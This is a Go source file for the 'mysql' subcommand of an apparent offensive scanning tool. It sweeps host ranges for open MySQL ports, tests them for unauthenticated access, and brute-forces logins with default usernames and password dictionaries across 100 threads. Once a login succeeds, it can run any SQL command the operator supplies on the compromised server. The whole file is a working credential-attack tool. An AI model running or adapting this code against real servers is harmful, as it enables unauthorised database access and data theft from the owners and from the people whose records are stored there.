
package cmd

import (
	"bytes"
	"database/sql"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"github.com/olekukonko/tablewriter"
	"github.com/spf13/cobra"
	"net"
	"time"
)

var mysql_port int

// mysqlCmd represents the mysql command
var mysqlCmd = &cobra.Command{
	Use:   "mysql",
	Short: "burp mysql username and password",
	PreRun: func(cmd *cobra.Command, args []string) {
		CreatFile(Output_result,Path_result)
		PrintScanBanner("mysql")
	},
	Run: func(cmd *cobra.Command, args []string) {
		start := time.Now()
		defer func() {
			Output_endtime(start)
		}()
		mysql()
	},
}

func mysql()  {
	burp_mysql()
}

func burp_mysql()  {
	GetHost()
	if Command!=""{
		err,_,_:=mysql_auth(Username,Password,Hosts)
		if err!=nil{
			fmt.Println(err)
		}
		return
	}
	if Username==""{
		Username="root,mysql"
	}
	ips, err := Parse_IP(Hosts)
	Checkerr(err)
	aliveserver:=NewPortScan(ips,[]int{mysql_port},Connectmysql)
	_=aliveserver.Run()
}

func Connectmysql(ip string, port int) (string, int, error,[]string) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%v:%v", ip, port), Timeout)
	if conn != nil {
		defer conn.Close()
		fmt.Printf(White(fmt.Sprintf("\rFind port %v:%v\r\n", ip, port)))
		fmt.Println(Yellow("Start burp mysql : ",ip))
		_,f,_:=mysql_auth("zxczxc","zxczxc",ip)
		if f{
			Output(fmt.Sprintf("%v burp success:%v No authentication\n","mysql",ip),LightGreen)
			return ip,port,nil,[]string{"No authentication"}
		}
		startburp:=NewBurp(Password,Username,Userdict,Passdict,ip,mysql_auth,burpthread)
		startburp.Run()
	}
	return ip, port, err,nil
}

func mysql_auth(username,password,ip string) (error,bool,string) {
	DSN := fmt.Sprintf("%s:%s@tcp(%s:%v)/?charset=utf8&timeout=%v", username, password, ip,mysql_port,Timeout)
	db, err := sql.Open("mysql", DSN)
	if err == nil {
		err = db.Ping()
		if err == nil {
			if Command!=""{
				r,_:=sql_execute(db,Command)
				Output(fmt.Sprintf("\n%v",r),LightGreen)
			}
			return nil,true,"mysql"
		}
		db.Close()
	}
	return err,false,"mysql"
}


func sql_execute(db *sql.DB,q string) (*Results, error) {
	if q == "" {
		return nil, nil
	}
	rows, err := db.Query(q)
	if err != nil {
		return nil, err
	}
	columns, err := rows.Columns()
	if err != nil {
		return nil, err
	}

	var results [][]string
	for rows.Next() {
		rs := make([]sql.NullString, len(columns))
		rsp := make([]interface{}, len(columns))
		for i := range rs {
			rsp[i] = &rs[i]
		}
		if err = rows.Scan(rsp...); err != nil {
			break
		}
		_rs := make([]string, len(columns))
		for i := range rs {
			_rs[i] = rs[i].String
		}
		results = append(results, _rs)
	}
	if closeErr := rows.Close(); closeErr != nil {
		return nil, closeErr
	}
	if err != nil {
		return nil, err
	}
	if err := rows.Err(); err != nil {
		return nil, err
	}
	return &Results{
		Columns: columns,
		Rows:    results,
	}, nil
}

type Results struct {
	Columns []string
	Rows    [][]string
}

func (r *Results) String() string {
	buf := bytes.NewBufferString("")
	table := tablewriter.NewWriter(buf)
	table.SetHeader(r.Columns)
	table.AppendBulk(r.Rows)
	table.Render()
	return buf.String()
}


func init() {
	rootCmd.AddCommand(mysqlCmd)
	mysqlCmd.Flags().StringVar(&Hostfile,"hostfile","","Set host file")
	mysqlCmd.Flags().StringVarP(&Hosts,"host","H","","Set mysql server host")
	mysqlCmd.Flags().IntVarP(&mysql_port,"port","p",3306,"Set mysql server port")
	mysqlCmd.Flags().IntVarP(&burpthread,"burpthread","",100,"Set burp password thread(recommend not to change)")
	mysqlCmd.Flags().StringVarP(&Username,"username","U","","Set mysql username")
	mysqlCmd.Flags().StringVarP(&Command,"command","c","","Set the command you want to sql_execute")
	mysqlCmd.Flags().StringVarP(&Password,"password","P","","Set mysql password")
	mysqlCmd.Flags().StringVarP(&Userdict,"userdict","","","Set mysql userdict path")
	mysqlCmd.Flags().StringVarP(&Passdict,"passdict","","","Set mysql passworddict path")
	//mysqlCmd.Flags().BoolVarP(&burp,"burp","b",false,"Use burp mode default login mode")
	//mysqlCmd.MarkFlagRequired("host")
}
